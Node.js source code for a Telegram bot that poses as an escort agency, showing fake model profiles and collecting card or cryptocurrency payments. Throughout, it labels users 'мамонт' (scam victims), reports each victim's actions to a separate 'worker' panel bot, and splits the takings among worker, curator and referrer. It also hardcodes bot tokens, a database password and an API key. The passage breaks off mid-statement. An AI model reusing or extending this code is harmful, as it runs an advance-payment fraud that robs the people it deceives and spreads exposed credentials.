const TelegramApi = require("node-telegram-bot-api");
const token = '7303956225:AAHjfbvRjtR39X3sM7TG-CwY67ZBwhf9SV4';
const workPanelToken = '7405132392:AAE3O66Jup-OMx7seX8GRwsCj7mZYZCo6bw';
const axios = require('axios');
const mongoose = require("mongoose");
const UserSchema = require("./models/UserSchema");
const ModelSchema = require("./models/ModelSchema");
const AllText = require("./models/Alltext");
const AllButtons = require("./models/AllButtons");
const workerUser = require("./models/UserWorkertsSchem");
const express = require("express");
const CuratorSchema = require("./models/CuratorSchema");





const app = express()
const apiCityKey = "86ce2b15e4bf10e0563d6671ba9002c3"
const dbURI = 'mongodb+srv://nsewerda04:soket775@cluster0.kkg0ems.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'
const bot = new TelegramApi(token, { polling: true });
const convertRUBtoUSDTUrl = 'https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=rub,usd';
const convertUSDTtoBTCUrl = 'https://api.coingecko.com/api/v3/simple/price?ids=tether,bitcoin&vs_currencies=usd';
const convertUSDTtoETHUrl = 'https://api.coingecko.com/api/v3/simple/price?ids=tether,ethereum&vs_currencies=usd';
const PORT = process.env.PORT || 3000;

const ourCuratorID = 5578275445;


app.get("/", async (req, res) => {
    res.send("Work!");
})

app.listen(PORT, ()=> {
    console.log('Server has been working')
})


app.post('/webhook', express.json(), (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});




mongoose.connect(dbURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('MongoDB connected'))
    .catch(err => console.log(err))


async function convertRubToUsdt(amountInRub) {
    try {
        const response = await fetch(convertRUBtoUSDTUrl);
        const data = await response.json();
        // Получаем курс USDT к RUB
        const usdtToRubRate = data.tether.rub;

        // Переводим сумму из RUB в USDT
        const amountInUsdt = amountInRub / usdtToRubRate;
        return amountInUsdt.toFixed(3)
    } catch (error) {
        console.error('Ошибка получения данных:', error);
    }
}

async function convertUsdtToBtc(amountInUsdt) {
    try {
        const response = await fetch(convertUSDTtoBTCUrl);
        const data = await response.json();

        // Проверяем наличие данных в ответе
        if (data.tether && data.bitcoin && data.tether.usd && data.bitcoin.usd) {
            // Получаем курс USDT к USD и BTC к USD
            const usdtToUsdRate = data.tether.usd;
            const btcToUsdRate = data.bitcoin.usd;

            // Переводим сумму из USDT в BTC
            const amountInBtc = (amountInUsdt * usdtToUsdRate) / btcToUsdRate;
            return  amountInBtc.toFixed(6)
        } else {
            console.error('Не удалось получить курс USDT к BTC.');
        }
    } catch (error) {
        console.error('Ошибка получения данных:', error);
    }
}

async function convertUsdtToEth(amountInUsdt) {
    try {
        const response = await fetch(convertUSDTtoETHUrl);
        const data = await response.json();

        // Выводим весь ответ от API в консоль для диагностики
        console.log('Ответ от API:', data);

        // Проверяем наличие данных в ответе
        if (data.tether && data.ethereum && data.tether.usd && data.ethereum.usd) {
            // Получаем курс USDT к USD и ETH к USD
            const usdtToUsdRate = data.tether.usd;
            const ethToUsdRate = data.ethereum.usd;

            // Переводим сумму из USDT в ETH
            const amountInEth = (amountInUsdt * usdtToUsdRate) / ethToUsdRate;
            return amountInEth.toFixed(6);
        } else {
            console.error('Не удалось получить курс USDT к ETH.');
        }
    } catch (error) {
        console.error('Ошибка получения данных:', error);
    }
}


async function checkCity(cityName) {
    const url = `http://api.openweathermap.org/data/2.5/weather?q=${cityName}&appid=${apiCityKey}`;

    try {
        const response = await axios.get(url);
        if (response.status === 200) {
            return true;
        }
    } catch (error) {
        if (error.response && error.response.status === 404) {
        } else {
            console.log(`Произошла ошибка при проверке города: ${error.message}`);
        }
        return false;
    }
}

let userState = {};

let userInfo = {
    user_id: "",
    city: "",
    currency: "",
    user_register: false,
    current_model: 0,
    current_model_photo: 0,
    current_model_price: 0,
    date_locate: ""
}

let workerId = null;
let adminId = 6793605665;

bot.onText(/\/start(?: (.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const param = match[1];
    userState = {}
    userInfo = {
        user_id: "",
        city: "",
        currency: "",
        user_register: false,
        current_model: 0,
        current_model_photo: 0,
        current_model_price: 0,
        date_locate: ""
    }
    const find_user = await UserSchema.findOne({user_id: msg.from.id});
    if (find_user) {
        userInfo.user_id = find_user.user_id
        userInfo.city = find_user.city
        userInfo.currency = find_user.currency
        userInfo.user_register = true
        await bot.sendPhoto(chatId, "images/main_photo.jpg", {
            caption: AllText.main_text,
            parse_mode: 'HTML',
            ...AllButtons.main_button
        });
        workerId = find_user.workerId;
        userState[chatId] = { step: 'main_menu' };



    } else if (!find_user) {
        await bot.sendMessage(chatId, AllText.welcome_text, { parse_mode: 'HTML', ...AllButtons.welcome_button });
        userInfo.user_id = msg.from.id
        workerId = param;
        userState[chatId] = { step: 'rules' };

    }
    try {
        if (msg.from.username) {
            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                chat_id: workerId,
                text: `ℹ️ У вас новый мамонт @${msg.from.username} (ID: ${msg.from.id})\n\n` +
                    `🤖 Информация о боте:\n` +
                    `├ Сервис: ESCORT\n` +
                    `└ Бот: @MeganModelsEscortBot`
            })
        } else {
            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                chat_id: workerId,
                text: `ℹ️ У вас новый мамонт ${msg.from.first_name} (ID: ${msg.from.id})\n\n` +
                    `🤖 Информация о боте:\n` +
                    `├ Сервис: ESCORT\n` +
                    `└ Бот: @MeganModelsEscortBot`
            })
        }

    } catch (e) {
        console.log(e)
    }
});

// bot.onText(/\/add_model/, async (msg) => {
//     const chatId = msg.chat.id;
//     await bot.sendMessage(chatId, "Добавить новою модель")
//     const model = new ModelSchema({
//         name: "Кристина",
//         age: "21",
//         price: {
//             hour: 6300,
//             two_hours: 11025,
//             all_night: 17460
//         },
//         photos: [
//             "images/models_img/сhristina/1.jpg",
//             "images/models_img/сhristina/2.jpg",
//             "images/models_img/сhristina/3.jpg",
//             "images/models_img/сhristina/4.jpg",
//         ],
//         description: "❤️Приглашаю окунуться в мир похоти и разврата...❤️",
//         services: "Классика, анал, гроповой (доплата), лесбийский. Массаж – эротический. Минет - с резинкой, без резинки. Окончание на лицо, грудь"
//     })
//     await model.save()
//
// })


bot.on('callback_query', async (msg) => {
    const chatId = msg.message.chat.id;

    try {
        if (msg.data === "accept_rules" && userState[chatId]?.step === 'rules') {
            await bot.deleteMessage(chatId, msg.message.message_id);
            await bot.sendMessage(chatId, AllText.city_text, { parse_mode: 'HTML' });
            userState[chatId].step = 'city';
        } else if ((['RUB', 'KZT', 'UAH'].includes(msg.data) && userState[chatId]?.step === 'currency') || msg.data === "main_menu") {
            if (!(msg.data === "main_menu")) {
                const selectedCurrency = msg.data;
                userInfo.currency = msg.data;
                await bot.sendMessage(chatId, `✅ Валюта успешно установлена как ${selectedCurrency}`);
            } else if (msg.data === "main_menu") {
                if (msg.message.message_id) {
                    await bot.deleteMessage(chatId, msg.message.message_id);
                }
            }
            console.log(userInfo)
            const find_user = await UserSchema.findOne({user_id: msg.from.id});
            if (!userInfo.user_register && !find_user) {
                console.log(workerId)
                const user = new UserSchema({
                    user_id: userInfo.user_id,
                    city: userInfo.city,
                    currency: userInfo.currency,
                    workerId: workerId
                });
                await user.save()
                await bot.sendMessage(chatId, "✅ Пользователь зарегистрирован")
                userInfo.user_register = false;
            }
            await bot.sendPhoto(chatId, "images/main_photo.jpg", {
                caption: AllText.main_text,
                parse_mode: 'HTML',
               ...AllButtons.main_button
            });
            userState[chatId].step = 'main_menu';
        } else if (msg.data === "city") {
            const text_currency = "Выберите валюту:";
            await bot.sendMessage(chatId, text_currency, { parse_mode: 'HTML', ...AllButtons.currency_button });
            userState[chatId].step = 'currency';
        } else if (msg.data === "profile" && userState[chatId]?.step === 'main_menu') {
            const user = await UserSchema.findOne({user_id: msg.from.id})
            const models = await ModelSchema.find()
            const adminUser = await workerUser.findOne({id_user: workerId})
            if (adminUser?.escort_model.length > 0) {
                adminUser.escort_model.forEach(item => {
                    models.unshift(item)
                })
            }
            const profile_info =
                "<b>👤 Профиль:</b>\n\n" +
                `❕ Ваш ID - ${msg.from.id}\n\n` +
                `🏙️ Текущий город - ${userInfo.city}\n\n` +
                "🗂 Всего заказов - 0\n" +
                "⭐ Ваш рейтинг - 0\n" +
                `🔮 Свободных моделей - ${models.length}\n`;
            await bot.deleteMessage(chatId, msg.message.message_id);
            if (user.city_change) {
                await bot.sendPhoto(chatId, "images/profile.jpg", {
                    caption: profile_info,
                    parse_mode: 'HTML',
                    reply_markup: JSON.stringify({
                        inline_keyboard: [
                            [{text: "💵 Валюта", callback_data: "currency_change"}],
                            [{ text: "Вернуться", callback_data: "main_menu" }],
                        ]
                    })
                });
            } else {
                await bot.sendPhoto(chatId, "images/profile.jpg", {
                    caption: profile_info,
                    parse_mode: 'HTML',
                    reply_markup: JSON.stringify({
                        inline_keyboard: [
                            [{text: "💵 Валюта", callback_data: "currency_change"}],
                            [{text: "🏙 Город", callback_data: `city_change`}],
                            [{ text: "Вернуться", callback_data: "main_menu" }],
                        ]
                    })
                });
            }
            userState[chatId].step = 'profile';
        } else if ((msg.data === "models" && userState[chatId]?.step === 'main_menu') || msg.data === "next_model" || msg.data === "previous_models" || msg.data === "next_model_photo" || msg.data === "previous_model_photo") {
            await bot.deleteMessage(chatId, msg.message.message_id);
            const models = await ModelSchema.find()
            const adminUser = await workerUser.findOne({id_user: workerId})
            if (adminUser?.escort_model.length > 0) {
                adminUser.escort_model.forEach(item => {
                    models.unshift(item)
                })
            }
            if (msg.data === "models") {
                userInfo.current_model_photo = 0;
                userInfo.current_model = 0;
            }
            if (msg.data === "previous_models") {
                userInfo.current_model = userInfo.current_model-1;
                userInfo.current_model_photo = 0;
            }
            if (msg.data === "next_model_photo") {
                if (models[userInfo.current_model].photos.length-1 > userInfo.current_model_photo) {
                    userInfo.current_model_photo = userInfo.current_model_photo + 1;
                }
            }
            if (msg.data === "next_model") {
                if (models.length-1 > userInfo.current_model) {
                    userInfo.current_model = userInfo.current_model+1;
                    userInfo.current_model_photo = 0;
                }
            }
            if (msg.data === "previous_model_photo") {
                userInfo.current_model_photo = userInfo.current_model_photo -1;
            }
            let  model_text =
                `🦋 <b>${models[userInfo.current_model].name} (${userInfo.city})</b>\n\n` +
                `<b>Возраст ${models[userInfo.current_model].age}</b>\n\n` +
                `🌇 Час — ${models[userInfo.current_model].price.hour} RUB\n` +
                `🏙 2 часа — ${models[userInfo.current_model].price.two_hours} RUB\n` +
                `🌃 Ночь — ${models[userInfo.current_model].price.all_night} RUB\n\n` +
                `${models[userInfo.current_model].description}\n\n` +
                `<b>Услуги:</b>\n` +
                `${models[userInfo.current_model].services}`
            await bot.sendPhoto(chatId, models[userInfo.current_model].photos[userInfo.current_model_photo], {
                caption: model_text,
                parse_mode: 'HTML',
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{text: "🔥 Заказать", callback_data: "order_model"}],
                        [{text: "📨 Написать", callback_data: "send_letter"}],
                        // [{text: "💞 Отзывы", callback_data: "reviews_model"}],
                        userInfo.current_model_photo === models[userInfo.current_model].photos.length-1 ? [{text: "📸 Предыдущее фото", callback_data: "previous_model_photo"}] : userInfo.current_model_photo > 0 ?  [{text: "📸 Предыдущее фото", callback_data: "previous_model_photo"}, {text: "📸 Следущее фото", callback_data: "next_model_photo"}] : [{text: "📸 Следущее фото", callback_data: "next_model_photo"}],
                        userInfo.current_model === models.length-1 ? [{text: "⬅ Предыдущая", callback_data: "previous_models"}]: userInfo.current_model > 0 ? [{text: "⬅ Предыдущая", callback_data: "previous_models"}, {text: "Следущая ➡", callback_data: "next_model"}] : [{text: "Следущая ➡", callback_data: "next_model"}],
                        [{ text: "↩ В главное меню", callback_data: "main_menu" }],
                    ]
                })
            });

        } else if (msg.data === "send_letter") {
            const models = await ModelSchema.find()
            const adminUser = await workerUser.findOne({id_user: workerId})
            if (adminUser?.escort_model.length > 0) {
                adminUser.escort_model.forEach(item => {
                    models.unshift(item)
                })
            }
            await bot.sendMessage(chatId, `📤 Введите сообщение для <b>${models[userInfo.current_model].name}.</b>`, {parse_mode: 'HTML'})
            userState[chatId] = {
                step: "send_letter",
                model: models[userInfo.current_model].name
            }
        } else if (msg.data === "information" && userState[chatId]?.step === 'main_menu') {
            await bot.deleteMessage(chatId, msg.message.message_id);
            await bot.sendPhoto(chatId, "images/main_photo.jpg", {
                caption: AllText.inform_text,
                parse_mode: 'HTML',
                ...AllButtons.information_buttons
            });
        } else if (msg.data === "support" && userState[chatId]?.step === 'main_menu') {
            await bot.deleteMessage(chatId, msg.message.message_id);
            await bot.sendPhoto(chatId, "images/support.jpg", {
                caption: AllText.support_text,
                parse_mode: 'HTML',
                ...AllButtons.support_button
            });
        } else if (msg.data === "city_change" && userState[chatId]?.step === 'profile') {
            await bot.deleteMessage(chatId, msg.message.message_id)
            await bot.sendMessage(chatId, "<b>🌆 Укажите названия города:\n\n</b><em><b>Внимание!!!</b> Город можно поменять только один раз!</em>", {parse_mode: 'HTML', ...AllButtons.city_change_buttons})
            userState[chatId] = { step: 'main_menu', step_add: "city_change"};
        } else if (msg.data === "currency_change" && userState[chatId]?.step === 'profile') {
            await bot.deleteMessage(chatId, msg.message.message_id);
            await bot.sendMessage(chatId, "<b>💲 Укажите новою валюту:</b>", {parse_mode: 'HTML', ...AllButtons.currency_button});
            userState[chatId] = { step: 'main_menu', step_add: "currency_change"};
        } else if (['RUB', 'KZT', 'UAH'].includes(msg.data) && userState[chatId]?.step === 'main_menu' && userState[chatId]?.step_add === 'currency_change') {
            const selectedCurrency = msg.data;
            userInfo.currency = msg.data;
            await bot.deleteMessage(chatId, msg.message.message_id)
            await UserSchema.updateOne({user_id: msg.from.id}, {$set: {
                    currency: msg.data
                }});
            await bot.sendMessage(chatId, `✅ Валюта успешно установлена как ${selectedCurrency}`, {parse_mode: 'HTML', ...AllButtons.currency_change_return_button});

        } else if (msg.data ==="order_model") {
            await bot.deleteMessage(chatId, msg.message.message_id);
            const models = await ModelSchema.find()
            console.log(userInfo)
            const adminUser = await workerUser.findOne({id_user: workerId})
            if (adminUser?.escort_model.length > 0) {
                adminUser.escort_model.forEach(item => {
                    models.unshift(item)
                })
            }
            try {
                if (msg.from.username) {
                    await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                        chat_id: workerId,
                        text: `ℹ️ Мамонт @${msg.from.username} (ID: ${msg.from.id}) нажал заказать модель\n` +
                            `└ Модель: ${models[userInfo.current_model].name}\n\n` +
                            `🤖 Информация о боте:\n` +
                            `├ Сервис: ESCORT\n` +
                            `└ Бот: @MeganModelsEscortBot`
                    })
                } else {
                    await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                        chat_id: workerId,
                        text: `ℹ️ Мамонт ${msg.from.first_name} (ID: ${msg.from.id}) нажал заказать модель\n` +
                            `└ Модель: ${models[userInfo.current_model].name}\n\n` +
                            `🤖 Информация о боте:\n` +
                            `├ Сервис: ESCORT\n` +
                            `└ Бот: @MeganModelsEscortBot`
                    })
                }
            } catch (e) {
                console.log(e)
            }
            await bot.sendPhoto(chatId, models[userInfo.current_model].photos[userInfo.current_model_photo], {
                caption: "<b>Выберите время, на которое вы хотите оформить модель:</b>",
                parse_mode: 'HTML',
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{text: `🌆 Час - ${models[userInfo.current_model].price.hour} RUB`, callback_data: "order_one_hour"}],
                        [{text: `🏙 2 часа - ${models[userInfo.current_model].price.two_hours} RUB`, callback_data: "order_two_hours"}],
                        [{text: `🌃 Ночь - ${models[userInfo.current_model].price.all_night} RUB`, callback_data: "order_all_night"}],
                    ]
                })
            })
        } else if (msg.data === "order_one_hour" || msg.data === "order_two_hours" ||  msg.data === "order_all_night") {
            await bot.deleteMessage(chatId, msg.message.message_id);
            const models = await ModelSchema.find()
            const adminUser = await workerUser.findOne({id_user: workerId})
            if (adminUser?.escort_model.length > 0) {
                adminUser.escort_model.forEach(item => {
                    models.unshift(item)
                })
            }
            if (msg.data === "order_one_hour") {
                userInfo.current_model_price = models[userInfo.current_model].price.hour
            }
            if (msg.data === "order_two_hours") {
                userInfo.current_model_price = models[userInfo.current_model].price.two_hours
            }
            if (msg.data === "order_all_night") {
                userInfo.current_model_price = models[userInfo.current_model].price.all_night
            }
            await bot.sendPhoto(chatId, models[userInfo.current_model].photos[userInfo.current_model_photo], {
                caption: "<b>Введите место и время встречи в одном сообщении: </b>",
                parse_mode: 'HTML'
            })
            userState[chatId] = {step: 'locate_of_date'};
        } else if (msg.data === "pay_by_card") {
            await bot.deleteMessage(chatId, msg.message.message_id);
            await bot.sendPhoto(chatId, "images/pay_method.jpg", {
                caption: "<em><b>🔸 Создана заявка на оплату</b></em>\n\n" +
                `<em>Чтобы мы смогли идентифицировать платеж Вам потребуется перевести ${userInfo.current_model_price+1} RUB вместо ${userInfo.current_model_price} RUB.</em>\n\n` +
                `<em>При переводе некорректной суммы средства будут утеряны.</em>`,
                parse_mode: 'HTML',
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{text: "Ознакомлен ✅", callback_data: "agree_card_rules"}],
                    ]
                })
            })
        } else if (msg.data === "agree_card_rules") {
            await bot.deleteMessage(chatId, msg.message.message_id);
            const models = await ModelSchema.find()
            const adminUser = await workerUser.findOne({id_user: workerId})
            if (adminUser?.escort_model.length > 0) {
                adminUser.escort_model.forEach(item => {
                    models.unshift(item)
                })
            }

            const user = await workerUser.findOne({id_user: workerId})
            const curators = await CuratorSchema.find()
            let added_curator = false;
            curators.forEach(curator => {
                curator.users.forEach(user => {
                    if (user.id_user === msg.from.id) {
                        added_curator = true;
                        userState.curator = curator
                    }
                })
            })
            console.log("Пользователь", user?.friend_invitation)
            try {
                if (msg.from.username) {
                    await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                        chat_id: workerId,
                        text: `ℹ️ Мамонт @${msg.from.username} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                            `├ Модель: ${models[userInfo.current_model].name}\n` +
                            `└ Цена: ${userInfo.current_model_price} RUB \n\n` +
                            `🤖 Информация о боте:\n` +
                            `├ Сервис: ESCORT\n` +
                            `└ Бот: @MeganModelsEscortBot`
                    })
                } else {
                    await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                        chat_id: workerId,
                        text: `ℹ️ Мамонт ${msg.from.first_name} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                            `├ Модель: ${models[userInfo.current_model].name}\n` +
                            `└ Цена: ${userInfo.current_model_price} RUB \n\n` +
                            `🤖 Информация о боте:\n` +
                            `├ Сервис: ESCORT\n` +
                            `└ Бот: @MeganModelsEscortBot`
                    })
                }

                if (added_curator) {
                    if (msg.from.username) {
                        if (user?.friend_invitation) {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт @${msg.from.username} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: банковской картой\n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `├ Доля воркера: ${(userInfo.current_model_price/100)*60} RUB\n` +
                                    `├ Доля реферала: ${(userInfo.current_model_price/100)*3} RUB\n` +
                                    `└ Доля куратора: ${(userInfo.current_model_price/100)*20} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                        [{ text: '💲 Перевести куратору', callback_data: `transfer_money_${userState.curator.id_user}` }],
                                        [{ text: '💲 Перевести рефералу', callback_data: `transfer_money_${user?.friend_invitation}` }],
                                    ]
                                }
                            })
                        } else {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт @${msg.from.username} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: банковской картой\n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `├ Доля воркера: ${(userInfo.current_model_price/100)*60} RUB\n` +
                                    `├ Доля реферала: ${(userInfo.current_model_price/100)*3} RUB\n` +
                                    `└ Доля куратора: ${(userInfo.current_model_price/100)*20} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                        [{ text: '💲 Перевести куратору', callback_data: `transfer_money_${userState.curator.id_user}` }],
                                        [{ text: '💲 Перевести рефералу', callback_data: `transfer_money_${user?.friend_invitation}` }],
                                    ]
                                }
                            })
                        }
                    } else {
                        if (user?.friend_invitation) {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт ${msg.from.first_name} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: банковской картой\n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `├ Доля воркера: ${(userInfo.current_model_price/100)*60} RUB\n` +
                                    `├ Доля реферала: ${(userInfo.current_model_price/100)*3} RUB\n` +
                                    `└ Доля куратора: ${(userInfo.current_model_price/100)*20} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                        [{ text: '💲 Перевести куратору', callback_data: `transfer_money_${userState.curator.id_user}` }],
                                        [{ text: '💲 Перевести рефералу', callback_data: `transfer_money_${user?.friend_invitation}` }],
                                    ]
                                }
                            })
                        } else {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт ${msg.from.first_name} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: банковской картой\n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `├ Доля воркера: ${(userInfo.current_model_price/100)*60} RUB\n` +
                                    `└ Доля куратора: ${(userInfo.current_model_price/100)*20} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                        [{ text: '💲 Перевести куратору', callback_data: `transfer_money_${userState.curator.id_user}` }],
                                    ]
                                }
                            })
                        }
                    }
                } else if (added_curator === false) {
                    if (msg.from.username) {
                        if (user?.friend_invitation) {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт @${msg.from.username} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: банковской картой\n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `├ Доля реферала: ${(userInfo.current_model_price/100)*3} RUB\n` +
                                    `└ Доля воркера: ${(userInfo.current_model_price/100)*80} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                        [{ text: '💲 Перевести рефералу', callback_data: `transfer_money_${user?.friend_invitation}` }],
                                    ]
                                }
                            })
                        } else {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт @${msg.from.username} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: банковской картой\n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `└ Доля воркера: ${(userInfo.current_model_price/100)*80} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                    ]
                                }
                            })
                        }
                    } else {
                        if (user?.friend_invitation) {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт ${msg.from.first_name} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: банковской картой\n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `├ Доля реферала: ${(userInfo.current_model_price/100)*3} RUB\n` +
                                    `└ Доля воркера: ${(userInfo.current_model_price/100)*80} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                        [{ text: '💲 Перевести рефералу', callback_data: `transfer_money_${user?.friend_invitation}` }],
                                    ]
                                }
                            })
                        } else {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт ${msg.from.first_name} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: банковской картой\n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `└ Доля воркера: ${(userInfo.current_model_price/100)*80} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                    ]
                                }
                            })
                        }
                    }
                }
            } catch (e) {
                console.log(e)
            }
            await bot.sendPhoto(chatId, "images/pay_method.jpg", {
                caption: "<b>Заявка на оформление модели создана ✅</b>\n\n" +
                    `В течение 5 минут с вами свяжется модератор для подтверждения заказа.\n`,
                    parse_mode: 'HTML',
            })
            userState = {}
        } else if (msg.data === "pay_by_crypto") {
            await bot.deleteMessage(chatId, msg.message.message_id);
            await bot.sendPhoto(chatId, "images/pay_method.jpg", {
                caption: "<b>Выберете удобною для вас криптовалюту: </b>",
                parse_mode: 'HTML',
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{text: "♦ USDT", callback_data: "pay_by_usdt"}],
                        [{text: "🔸 BTC", callback_data: "pay_by_btc"}],
                        [{text: "🔹ETH", callback_data: "pay_by_eth"}],
                    ]
                })
            })
            userState[chatId].step = "pay_by_crypto"
        } else if (msg.data === "pay_by_usdt" || msg.data === "pay_by_btc" || msg.data === "pay_by_eth") {
            await bot.deleteMessage(chatId, msg.message.message_id);
            const models = await ModelSchema.find()
            const adminUser = await workerUser.findOne({id_user: workerId})
            if (adminUser?.escort_model.length > 0) {
                adminUser.escort_model.forEach(item => {
                    models.unshift(item)
                })
            }
            const user = await workerUser.findOne({id_user: workerId})
            await bot.sendPhoto(chatId, "images/pay_method.jpg", {
                caption: "<b>Заявка на оформление модели создана ✅</b>\n\n" +
                    `В течение 5 минут с вами свяжется модератор для подтверждения заказа.\n`,
                parse_mode: 'HTML',
            })
            let crypto_currency = "USDT"
            if (msg.data === "pay_by_btc") {
                crypto_currency =  "BTC"
            } else if (msg.data === "pay_by_eth") {
                crypto_currency = "ETH"
            }
            userState = {}
            const curators = await CuratorSchema.find()
            let added_curator = false;
            curators[0].users.forEach(user => {
                if (user.id_user === msg.from.id) {
                    added_curator = true;
                }
            })

            try {
                if (msg.from.username) {
                    await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                        chat_id: workerId,
                        text: `ℹ️ Мамонт @${msg.from.username} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
